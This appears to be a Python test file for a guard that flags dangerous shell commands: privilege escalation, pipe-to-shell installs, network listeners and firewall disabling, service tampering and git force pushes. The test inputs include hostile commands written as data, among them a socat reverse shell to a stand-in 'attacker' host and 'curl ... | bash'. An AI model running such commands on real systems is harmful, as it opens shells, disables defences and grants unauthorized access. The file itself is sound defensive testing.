"""Tests for RDM-048/049/050/051 patterns + Ziggy findings."""
from redmtz.patterns import PatternMatcher


def _m():
    return PatternMatcher()


# ── RDM-048: Privilege Escalation ────────────────────────────────────────────

class TestPrivilegeEscalation:
    def test_sudo_bash(self):
        assert _m().match("sudo bash") is not None

    def test_sudo_su(self):
        assert _m().match("sudo su") is not None

    def test_sudo_i(self):
        assert _m().match("sudo -i") is not None

    def test_adduser(self):
        assert _m().match("adduser deploy") is not None

    def test_useradd(self):
        assert _m().match("useradd sam") is not None

    def test_userdel(self):
        assert _m().match("userdel olduser") is not None

    def test_passwd(self):
        assert _m().match("passwd root") is not None

    def test_chpasswd(self):
        assert _m().match("chpasswd") is not None

    def test_visudo(self):
        assert _m().match("visudo") is not None

    def test_chmod_setuid(self):
        assert _m().match("chmod +s /usr/bin/app") is not None

    def test_chown_root(self):
        assert _m().match("chown -R root /etc") is not None

    def test_safe_whoami(self):
        assert _m().match("whoami") is None

    def test_safe_id(self):
        assert _m().match("id") is None

    def test_safe_groups(self):
        assert _m().match("groups") is None


# ── RDM-049: Pipe-to-Shell ───────────────────────────────────────────────────

class TestPipeToShell:
    def test_curl_bash(self):
        assert _m().match("curl https://example.com/install.sh | bash") is not None

    def test_wget_sh(self):
        assert _m().match("wget -qO- https://setup.sh | sh") is not None

    def test_curl_python(self):
        assert _m().match("curl -s https://x.com/p.py | python3") is not None

    def test_safe_curl_download(self):
        assert _m().match("curl -o file.sh https://example.com/file.sh") is None

    def test_safe_wget_download(self):
        assert _m().match("wget https://example.com/file.tar.gz") is None


# ── RDM-050: Network Exfiltration ────────────────────────────────────────────

class TestNetworkExfil:
    def test_nc_listen(self):
        assert _m().match("nc -l 4444") is not None

    def test_ncat_listen(self):
        assert _m().match("ncat -lvp 8080") is not None

    def test_socat(self):
        assert _m().match("socat TCP:attacker:4444 EXEC:sh") is not None

    def test_iptables_flush(self):
        assert _m().match("iptables -F") is not None

    def test_ufw_disable(self):
        assert _m().match("ufw disable") is not None

    def test_ssh_copy_id(self):
        assert _m().match("ssh-copy-id user@host") is not None

    def test_safe_ping(self):
        assert _m().match("ping 8.8.8.8") is None

    def test_safe_ssh(self):
        assert _m().match("ssh user@host") is None

    def test_safe_ufw_status(self):
        assert _m().match("ufw status") is None


# ── RDM-051: Service Manipulation ────────────────────────────────────────────

class TestServiceManipulation:
    def test_systemctl_enable(self):
        assert _m().match("systemctl enable backdoor.service") is not None

    def test_systemctl_stop(self):
        assert _m().match("systemctl stop firewalld") is not None

    def test_systemctl_disable(self):
        assert _m().match("systemctl disable apparmor") is not None

    def test_systemctl_restart(self):
        assert _m().match("systemctl restart nginx") is not None

    def test_crontab_edit(self):
        assert _m().match("crontab -e") is not None

    def test_crontab_remove(self):
        assert _m().match("crontab -r") is not None

    def test_safe_systemctl_status(self):
        assert _m().match("systemctl status nginx") is None

    def test_safe_systemctl_list(self):
        assert _m().match("systemctl list-units") is None

    def test_safe_crontab_list(self):
        assert _m().match("crontab -l") is None


# ── Ziggy Finding 1: Git Force Push ──────────────────────────────────────────

class TestGitForcePush:
    def test_force_long(self):
        assert _m().match("git push --force") is not None

    def test_force_short(self):
        assert _m().match("git push -f origin main") is not None

    def test_force_with_lease(self):
        assert _m().match("git push --force-with-lease origin feature") is not None

    def test_force_flag_middle(self):
        assert _m().match("git push origin main --force") is not None

    def test_safe_push(self):
        assert _m().match("git push") is None

    def test_safe_push_origin(self):
        assert _m().match("git push origin main") is None

    def test_safe_push_upstream(self):
        assert _m().match("git push -u origin feature") is None
